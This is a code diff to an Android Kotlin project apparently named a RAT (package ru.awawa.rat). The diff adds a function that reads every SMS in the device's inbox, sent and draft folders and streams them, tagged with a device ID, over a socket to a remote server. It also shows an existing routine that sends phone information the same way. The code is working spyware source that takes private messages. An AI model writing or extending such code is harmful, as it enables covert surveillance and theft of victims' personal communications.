@@ -12,6 +12,7 @@ import ru.awawa.rat.Application
 import ru.awawa.rat.helper.BuildInfo
 import ru.awawa.rat.helper.ContactsHelper
 import ru.awawa.rat.helper.Preferences
+import ru.awawa.rat.helper.SmsHelper
 import java.io.*
 import java.net.InetSocketAddress
 import java.net.Socket
@@ -98,6 +99,39 @@ object Interactor {
             if (result[0] != "ok") {
                 val error = result.getOrElse(1) { "" }
                 Log.e(TAG, "Phone info sending failed: $error")
+            }
+
+            socket.close()
+        }
+    }
+
+    fun sendSms() {
+        GlobalScope.launch(Dispatchers.IO) {
+            val socket = Socket()
+            socket.connect(InetSocketAddress(SERVER_IP, SERVER_PORT))
+
+            val uuid = Preferences.get<String>(Preferences.PreferencesField.UUID) ?: ""
+
+            val inbox = SmsHelper.readMessages(Application.context, SmsHelper.INBOX).joinToString("\n") { it }
+            socket.getOutputStream().write(
+                "sms${dataDivider}$uuid${dataDivider}INBOX${dataDivider}$inbox\n".toByteArray()
+            )
+
+            val sent = SmsHelper.readMessages(Application.context, SmsHelper.SENT).joinToString("\n") { it }
+            socket.getOutputStream().write(
+                "sms${dataDivider}$uuid${dataDivider}SENT${dataDivider}$sent\n".toByteArray()
+            )
+
+            val draft = SmsHelper.readMessages(Application.context, SmsHelper.DRAFT).joinToString("\n") { it }
+            socket.getOutputStream().write(
+                "sms${dataDivider}$uuid${dataDivider}DRAFT${dataDivider}$draft\n".toByteArray()
+            )
+
+            val result = socket.getInputStream().bufferedReader().readLine().split(dataDivider)
+
+            if (result[0] != "ok") {
+                val error = result.getOrElse(1) { "" }
+                Log.e(TAG, "SMS sending failed: $error")
             }
 
             socket.close()
